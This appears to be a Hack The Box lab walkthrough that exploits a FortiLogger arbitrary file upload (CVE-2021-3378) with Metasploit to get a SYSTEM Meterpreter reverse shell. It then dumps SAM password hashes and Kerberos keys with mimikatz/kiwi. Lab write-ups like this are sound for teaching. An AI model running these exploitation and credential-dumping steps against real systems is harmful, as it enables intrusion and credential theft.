### HTB Pentester Path <br>
### Metasploit Framework - Meterpreter <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

IP: 10.129.184.195

---

### Question 1:
Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

Started with an nmap:
```diff
+ $ sudo nmap -sT -sC -sV -A -F -v 10.129.184.195
```

	PORT     STATE SERVICE       VERSION
	135/tcp  open  msrpc         Microsoft Windows RPC
	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds?
	3389/tcp open  ms-wbt-server Microsoft Terminal Services
	| rdp-ntlm-info: 
	|   Target_Name: WIN-51BJ97BCIPV
	|   NetBIOS_Domain_Name: WIN-51BJ97BCIPV
	|   NetBIOS_Computer_Name: WIN-51BJ97BCIPV
	|   DNS_Domain_Name: WIN-51BJ97BCIPV
	|   DNS_Computer_Name: WIN-51BJ97BCIPV
	|   Product_Version: 10.0.17763
	|_  System_Time: 2025-10-04T19:14:11+00:00
	|_ssl-date: 2025-10-04T19:14:19+00:00; 0s from scanner time.
	| ssl-cert: Subject: commonName=WIN-51BJ97BCIPV
	| Issuer: commonName=WIN-51BJ97BCIPV
	| Public Key type: rsa
	| Public Key bits: 2048
	| Signature Algorithm: sha256WithRSAEncryption
	| Not valid before: 2025-10-03T19:02:41
	| Not valid after:  2026-04-04T19:02:41
	| MD5:   80c0:4937:9b4d:1db6:ee1c:666e:a9cb:0ecc
	|_SHA-1: 1892:6a50:e2b3:c867:2078:f5fa:72c6:0c3c:81c0:22a0
	5000/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	| http-methods: 
	|   Supported Methods: OPTIONS TRACE GET HEAD POST
	|_  Potentially risky methods: TRACE
	|_http-title: FortiLogger | Log and Report System
	|_http-favicon: Unknown favicon MD5: E4B674BE34803DBC1F1D53737A490D0C
	|_http-server-header: Microsoft-IIS/10.0
	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
	TCP/IP fingerprint:
	OS:SCAN(V=7.94SVN%E=4%D=10/4%OT=135%CT=7%CU=36323%PV=Y%DS=2%DC=T%G=Y%TM=68E
	OS:1720B%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=I%TS=U)SEQ(SP=10
	OS:5%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=105%GCD=2%ISR=10C%TI=I%C
	OS:I=I%II=I%SS=S%TS=U)OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8
	OS:NNS%O5=M552NW8NNS%O6=M552NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF
	OS:%W6=FF70)ECN(R=N)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF
	OS:=Y%T=80%S=O%A=O%F=AS%RD=0%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R
	OS:=N)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z
	OS:%A=S%F=AR%O=%RD=0%Q=)T3(R=N)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=
	OS:)T4(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0
	OS:%S=O%A=O%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0
	OS:%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=8
	OS:0%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=O%A=O%F=R%O=%RD=0%Q=
	OS:)T7(R=N)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=
	OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%R
	OS:ID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)IE(R=Y%DFI=N%T=80%CD=Z)
	
	Network Distance: 2 hops
	TCP Sequence Prediction: Difficulty=261 (Good luck!)
	IP ID Sequence Generation: Incremental
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb2-time: 
	|   date: 2025-10-04T19:14:13
	|_  start_date: N/A
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required

Browsing to the ip at port 5000, we see a FortiLogger login page.
I tried logging in with admin:admin and it worked, lol.
Nothing sticks out inside the webapp, so lets refine a new nmap scan for vulns on port 5000:
```diff
+ $ sudo nmap -sT -A -sV --script=vuln -p 5000 10.129.184.195
```

	Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-04 14:32 CDT
	Nmap scan report for 10.129.184.195
	Host is up (0.0086s latency).
	
	PORT     STATE SERVICE VERSION
	5000/tcp open  http    Microsoft IIS httpd 10.0
	| http-csrf: 
	| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.184.195
	|   Found the following possible CSRF vulnerabilities: 
	|     
	|     Path: http://10.129.184.195:5000/
	|     Form id: loginform_id
	|     Form action: /Login/Login
	|     
	|     Path: http://10.129.184.195:5000/home
	|     Form id: loginform_id
	|_    Form action: /Login/Login
	| http-fileupload-exploiter: 
	|   
	|     Couldn't find a file-type field.
	|   
	|_    Couldn't find a file-type field.
	| http-sql-injection: 
	|   Possible sqli for queries:
	|     http://10.129.184.195:5000/assets/global/scripts/lang.en.js?v=3.1.7.22799%27%20OR%20sqlspider
	|_    http://10.129.184.195:5000/assets/global/scripts/lang.en.js?v=3.1.7.22799%27%20OR%20sqlspider

There's at least one vulnerability here, lets search it in metasploit:
```diff
+ [msf](Jobs:0 Agents:0) >> search fortilogger
```

	Matching Modules
	================
	
	   #  Name                                                   Disclosure Date  Rank    Check  Description
	   -  ----                                                   ---------------  ----    -----  -----------
	   0  exploit/windows/http/fortilogger_arbitrary_fileupload  2021-02-26       normal  Yes    FortiLogger Arbitrary File Upload Exploit
```diff
+ [msf](Jobs:0 Agents:0) >> use 0
```

	[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```diff
+ [msf](Jobs:0 Agents:0) exploit(windows/http/fortilogger_arbitrary_fileupload) >> info
```

	       Name: FortiLogger Arbitrary File Upload Exploit
	     Module: exploit/windows/http/fortilogger_arbitrary_fileupload
	   Platform: Windows
	       Arch: x86, x64
	 Privileged: No
	    License: Metasploit Framework License (BSD)
	       Rank: Normal
	  Disclosed: 2021-02-26
	
	Provided by:
	  Berkan Er <b3rsec@protonmail.com>
	
	Module side effects:
	 artifacts-on-disk
	 ioc-in-logs
	
	Module stability:
	 crash-safe
	
	Module reliability:
	 unreliable-session
	
	Available targets:
	      Id  Name
	      --  ----
	  =>  0   FortiLogger < 5.2.0
	
	Check supported:
	  Yes
	
	Basic options:
	  Name       Current Setting  Required  Description
	  ----       ---------------  --------  -----------
	  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, sapn
	                                        i, socks5h, http
	  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.htm
	                                        l
	  RPORT      5000             yes       The target port (TCP)
	  SSL        false            no        Negotiate SSL/TLS for outgoing connections
	  TARGETURI  /                yes       The base path to the FortiLogger
	  VHOST                       no        HTTP server virtual host
	
	Payload information:
	
	Description:
	  This module exploits an unauthenticated arbitrary file upload
	  via insecure POST request. It has been tested on versions < 5.2.0 in
	  Windows 10 Enterprise.
	
	References:
	  https://nvd.nist.gov/vuln/detail/CVE-2021-3378
	  https://erberkan.github.io/2021/cve-2021-3378/

Now set the L & R hosts accordingly, and exploit:
```diff
+ [msf](Jobs:0 Agents:0) exploit(windows/http/fortilogger_arbitrary_fileupload) >> set rhost 10.129.184.195
+ [msf](Jobs:0 Agents:0) exploit(windows/http/fortilogger_arbitrary_fileupload) >> set lhost tun0
```
```diff
+ [msf](Jobs:0 Agents:0) exploit(windows/http/fortilogger_arbitrary_fileupload) >> exploit
```

	[*] Started reverse TCP handler on 10.10.14.238:4444 
	[*] Running automatic check ("set AutoCheck false" to disable)
	[+] The target is vulnerable. FortiLogger version 4.4.2.2
	[+] Generate Payload
	[+] Payload has been uploaded
	[*] Executing payload...
	[*] Sending stage (177734 bytes) to 10.129.184.195
	[*] Meterpreter session 1 opened (10.10.14.238:4444 -> 10.129.184.195:49711) at 2025-10-04 14:52:00 -0500

Now we can drop into a sys shell and find the current user:
```diff
+ (Meterpreter 1)(C:\Windows\system32) > shell
```

	Process 5816 created.
	Channel 1 created.
	Microsoft Windows [Version 10.0.17763.2628]
	(c) 2018 Microsoft Corporation. All rights reserved.
```diff
+ C:\Windows\system32>whoami
```

	nt a--edit--ity\system

🚩 found **nt auth--edit--stem**.

---

### Question 2:
Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.

Back to meterpreter:
```diff
+ C:\Windows\system32>^C
```

	Terminate channel 1? [y/N]  y

Now to dump the SAM:
```diff
+ (Meterpreter 1)(C:\Windows\system32) > load kiwi
```

	Loading extension kiwi...
	  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
	 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
	 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
	 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
	 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
	  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
	
	[!] Loaded x86 Kiwi on an x64 architecture.
	
	Success.
```diff
+ (Meterpreter 1)(C:\Windows\system32) > lsa_dump_sam
```

	[+] Running as SYSTEM
	[*] Dumping SAM
	Domain : WIN-51BJ97BCIPV
	SysKey : c897d22c1c56490b453e326f86b2eef8
	Local SID : S-1-5-21-2348711446-3829538955-3974936019
	
	SAMKey : e52d743c76043bf814df6e48f1efcb23
	
	RID  : 000001f4 (500)
	User : Administrator
	  Hash NTLM: bdaffbfe64f1fc646a3353be1c2c3c99
	
	Supplemental Credentials:
	* Primary:NTLM-Strong-NTOWF *
	    Random Value : d0e507b237b40a3a1f62ba1935465406
	
	* Primary:Kerberos-Newer-Keys *
	    Default Salt : WIN-51BJ97BCIPVAdministrator
	    Default Iterations : 4096
	    Credentials
	      aes256_hmac       (4096) : 545c81812fc803221b22e47ab8789c104f38b151c677fbc4006894db6d174f1b
	      aes128_hmac       (4096) : 5d59bcd0e74c5ed8951b9f2b658eef43
	      des_cbc_md5       (4096) : 76436b1c190d892a
	    OldCredentials
	      aes256_hmac       (4096) : a394ab9b7c712a9e0f3edb58404f9cf086132d29ab5b796d937b197862331b07
	      aes128_hmac       (4096) : 7630dab9bdaeebf9b4aa6c595347a0cc
	      des_cbc_md5       (4096) : 9876615285c2766e
	    OlderCredentials
	      aes256_hmac       (4096) : 09c55a10e6b955caac4abbf7ff37b81488a2ede67a150c00c775fa00d94768ab
	      aes128_hmac       (4096) : b49643128581ac08a1fae957f7787f72
	      des_cbc_md5       (4096) : d32592d63b75ec1f
	
	* Packages *
	    NTLM-Strong-NTOWF
	
	* Primary:Kerberos *
	    Default Salt : WIN-51BJ97BCIPVAdministrator
	    Credentials
	      des_cbc_md5       : 76436b1c190d892a
	    OldCredentials
	      des_cbc_md5       : 9876615285c2766e
	
	
	RID  : 000001f5 (501)
	User : Guest
	
	RID  : 000001f7 (503)
	User : DefaultAccount
	
	RID  : 000001f8 (504)
	User : WDAGUtilityAccount
	  Hash NTLM: 4b4ba140ac0767077aee1958e7f78070
	
	Supplemental Credentials:
	* Primary:NTLM-Strong-NTOWF *
	    Random Value : 92793b2cbb0532b4fbea6c62ee1c72c8
	
	* Primary:Kerberos-Newer-Keys *
	    Default Salt : WDAGUtilityAccount
	    Default Iterations : 4096
	    Credentials
	      aes256_hmac       (4096) : c34300ce936f766e6b0aca4191b93dfb576bbe9efa2d2888b3f275c74d7d9c55
	      aes128_hmac       (4096) : 6b6a769c33971f0da23314d5cef8413e
	      des_cbc_md5       (4096) : 61299e7a768fa2d5
	
	* Packages *
	    NTLM-Strong-NTOWF
	
	* Primary:Kerberos *
	    Default Salt : WDAGUtilityAccount
	    Credentials
	      des_cbc_md5       : 61299e7a768fa2d5
	
	
	RID  : 000003ea (1002)
	User : htb-student
	  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
	
	Supplemental Credentials:
	* Primary:NTLM-Strong-NTOWF *
	    Random Value : f88979e2a6999b5cbc7a9308e7b4cd82
	
	* Primary:Kerberos-Newer-Keys *
	    Default Salt : WIN-51BJ97BCIPVhtb-student
	    Default Iterations : 4096
	    Credentials
	      aes256_hmac       (4096) : 1ed226feb91bfd21489a12a58c6cb38b99ab70feb30d971c8987fb44bcb15213
	      aes128_hmac       (4096) : 629343148027bcf0d48cf49b066a9960
	      des_cbc_md5       (4096) : 379791d616ef6d0e
	
	* Packages *
	    NTLM-Strong-NTOWF
	
	* Primary:Kerberos *
	    Default Salt : WIN-51BJ97BCIPVhtb-student
	    Credentials
	      des_cbc_md5       : 379791d616ef6d0e

🚩 found **cf3a5525ee9414229e--edit--66279623ed5c58**.
